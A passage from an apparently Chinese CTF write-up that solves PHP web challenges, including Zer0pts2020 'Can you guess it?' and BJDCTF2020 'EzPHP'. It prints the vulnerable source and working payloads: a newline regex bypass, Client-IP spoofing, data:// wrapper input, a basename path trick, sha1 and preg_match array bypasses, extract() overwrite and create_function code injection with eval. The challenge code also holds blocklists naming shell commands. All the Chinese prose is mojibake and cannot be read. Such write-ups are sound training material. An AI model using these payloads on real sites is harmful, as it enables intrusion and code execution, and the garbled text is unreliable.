href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p></blockquote><p>ç¬¬äºŒä¸ªifä¸­æ­£åˆ™åŒ¹é…è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ï¼Œç”±äºåœ¨å­—ç¬¦ä¸²ä¸­æ¢è¡Œå¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥å¯ä»¥ç”¨%0aç»•è¿‡ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p></blockquote><p>æ‰€ä»¥ç¬¬ä¸€å±‚çš„payloadå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708195848.png" alt=""></p><h4 id="ç¬¬äºŒå±‚">ç¬¬äºŒå±‚</h4><p>æŸ¥çœ‹æºä»£ç ï¼Œæœ‰ä¸€å¤§ä¸²çš„JSFuckç¼–ç ï¼Œç›´æ¥æ‹¿åˆ°consoleè·‘</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708200030.png" alt=""></p><p>æç¤ºéœ€è¦POSTä¸€ä¸‹Merakæ•°æ®ï¼Œå†…å®¹ä»»æ„ã€‚ç»§ç»­å®¡è®¡ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>åªå…è®¸æœ¬åœ°ç™»å½•ï¼Œé‚£ä¹ˆå°±åŠ ä¸Š<code>Client-IP:127.0.0.1</code>çš„Headerã€‚æ¥ç€ä½¿ç”¨dataä¼ªåè®®ä»<code>2333</code>å‚æ•°ä¸­è¯»å–<code>todat is a happy day</code>ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯é€†å‘changeå‡½æ•°ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr(ord($v[$i]) - $i*<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$real = unchange(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($real);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç¬¬äºŒå±‚çš„payloadå°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333&#x3D;data:text&#x2F;plain,tadat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D;</span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it">[Zer0pts2020]Can you guess it?</h2><h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3><ul><li><code>$_SEVER['PHP_SELF']</code>åˆ©ç”¨</li><li><code>basename()</code>ç»•è¿‡</li></ul><h3 id="è§£é¢˜-v9">è§£é¢˜</h3><p>åˆ©ç”¨ç‚¹åœ¨:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‰é¢è¿˜æœ‰è¿‡æ»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>$_SERVER['PHP_SELF']</code>æˆ‘ä»¬çŸ¥é“å®ƒçš„å€¼æ˜¯urlç›¸å¯¹è·¯å¾„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥<code>/index.php/config.php?source</code> ä¼šè¿”å›<code>/index.php/config.php</code></p><p>æˆ‘ä»¬çŸ¥é“<code>preg_match</code> æ˜¯éœ€è¦å®Œå…¨åŒ¹é…æ‰ä¼šè¿”å›trueçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥<code>/index.php/config.php/a</code>å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯basenameçš„ç»“æœä¼šæ˜¯<code>a</code>æ˜¾ç„¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ²¡è¿™ä¸ªæ–‡ä»¶ã€‚æ­¤æ—¶æˆ‘ä»¬æƒ³åˆ°äº†basenameä¼šå¿½ç•¥ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦<code>%80 ~ %ff</code>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥<code>/index.php/comfig.php/%ff</code> å°±å¯ä»¥è¿›è¡Œæ˜¾ç¤ºcomfig.phpæ–‡ä»¶ï¼Œè¿™é‡Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åœ¨index.phpä¸‹è¿›è¡Œçš„ï¼ˆæˆ‘ä»¬çœ‹åˆ°çš„ä»£ç éƒ½æ˜¯index.phpçš„ä»£ç ï¼‰ã€‚å½“ç„¶æˆ‘ä»¬ä¸è¦å¿˜è®°ä¼ getçš„å˜é‡sourceã€‚</p><p>payloadï¼š<code>/index.php/config.php/%81?source</code></p><h2 id="BJDCTF2020-EzPHP">[BJDCTF2020]EzPHP</h2><h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3><ul><li>QUERY_STRINGç»•è¿‡</li><li>SHA1æ•°ç»„ç»•è¿‡</li><li>preg_matchæ•°ç»„ç»•è¿‡</li><li>extractå˜é‡è¦†ç›–</li><li>create_functionæ³¨å…¥</li></ul><h3 id="è§£é¢˜-v10">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line">$shana = $_GET[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">$arg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SERVER-â€˜QUERY-STRINGâ€™-ç»•è¿‡">$_SERVER[â€˜QUERY_STRINGâ€™]ç»•è¿‡</h4><p>éœ€è¦æ˜ç¡®ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><p><code>$_SERVER['QUERY_STRING']</code>è¿”å›urlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰ï¼š</p><ul><li><code>$_SERVER['REQUEST_URI']</code>è¿”å›è®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI</li><li><code>$_SERVER['SCRIPT_NAME']</code>è¿”å›åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„</li><li><code>$_SERVER['PHP_SELF']</code>å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼š(æµè§ˆå™¨è‡ªåŠ¨å°†fileçš„urlç¼–ç è§£ç äº†)</p><p><img src="https://www.moonback.xyz/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM%E6%88%AA%E5%9B%BE20200210162052.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>$_SERVER['QUERY_STRING']</code>å’Œ<code>$_SERVER['REQUEST_URI']</code>åœ¨ä¼ è¾“æ—¶ä¸ä¼šurlè§£ç ï¼Œè€Œ<code>$_GET</code>,<code>$_POST</code>ä¼šurlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥urlç¼–ç ç»•è¿‡ä¸‹é¢ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="preg-matchæ¢è¡Œç¬¦ç»•è¿‡">preg_matchæ¢è¡Œç¬¦ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰<code>/s</code>ä¿®é¥°ç¬¦ç”¨æ¥åœ¨åŒ¹é…æ—¶åŒ¹é…æ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>%0a</code>æ¢è¡Œæ±¡æŸ“ç»•è¿‡ã€‚</p><h4 id="REQUESTå­—æ¯åŒ¹é…ç»•è¿‡">$_REQUESTå­—æ¯åŒ¹é…ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_REQUEST</code>åŒ…å«<code>_POST</code>ã€<code>_GET</code>å’Œ<code>COOKIE</code>ä¸‰ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥POSTåŒæ ·åç§°æ»¡è¶³æ¡ä»¶çš„å€¼ï¼Œæ¯”å¦‚æ•°å­—å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªåŒ¹é…ã€‚å¦å¤–ï¼Œæ•°ç»„ç±»å‹çš„æ•°æ®ä¸éœ€è¦POSTï¼Œ<code>preg_match()</code>åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚</p><blockquote><p>æˆ‘åœ¨BUUOJä¸Šé¢åšè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œä¸€ç›´ç»•ä¸è¿‡è¿™ä¸ªå­—æ¯åŒ¹é…ï¼Œå†ä»”ç»†ä¸€çœ‹ï¼Œå‘ç°æ˜¯buuè‡ªå¸¦çš„cookieçš„åŸå› ï¼Œåˆ æ‰å³å¯ã€‚</p></blockquote><h4 id="file-get-contentsæ¯”å¯¹ç»•è¿‡">file_get_contentsæ¯”å¯¹ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>åˆšå¼€å§‹æƒ³çš„æ˜¯<code>php://input</code>ï¼Œåæ¥å‘ç°è¦POSTæ•°æ®ï¼Œå› æ­¤ä¾¿ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨<code>data://</code>ï¼Œç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><h4 id="sha1æ¯”è¾ƒ">sha1æ¯”è¾ƒ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ•°ç»„ç»•è¿‡ã€‚</p><h4 id="extractå˜é‡è¦†ç›–">extractå˜é‡è¦†ç›–</h4><p>å› ä¸º<code>extract()</code>å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¼ æ•°ç»„ï¼Œå³<code>flag[code]</code>å’Œ<code>flag[arg]</code>çš„å½¢å¼ã€‚</p><h4 id="create-functionä»£ç æ³¨å…¥">create_functionä»£ç æ³¨å…¥</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬çš„æ³¨å…¥å½¢å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ—¶ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é“é¢˜ç¦ç”¨äº†å¾ˆå¤šç±»ä¼¼æ— å‚æ•°RCEçš„å‡½æ•°å…³é”®å­—ï¼Œä¹Ÿç¦ç”¨äº†å¾ˆå¤šè¯»æ–‡ä»¶çš„ç³»ç»Ÿå‘½ä»¤ã€‚</p><p>ä½†æ˜¯ä»£ç ä¸­å·²ç»åŒ…å«äº†<code>flag.php</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨é‡Œé¢çš„å˜é‡ã€‚æ‰€ä»¥è¦æƒ³åŠæ³•åœ¨ä¸æŒ‡å®šå˜é‡åç§°çš„æƒ…å†µä¸‹è¾“å‡ºå˜é‡çš„å€¼ï¼Œå¯ä»¥æƒ³åˆ°ï¼š<strong>æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½è¾“å‡ºæ‰€æœ‰å˜é‡çš„å€¼ï¼Ÿ</strong></p><p>ç­”æ¡ˆæ˜¯<code>get_defined_vars()</code>ç”¨æ¥è¾“å‡ºæ‰€æœ‰å˜é‡å’Œå€¼ã€‚</p><p>é‚£ä¹ˆæ•´ä½“çš„payloadå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 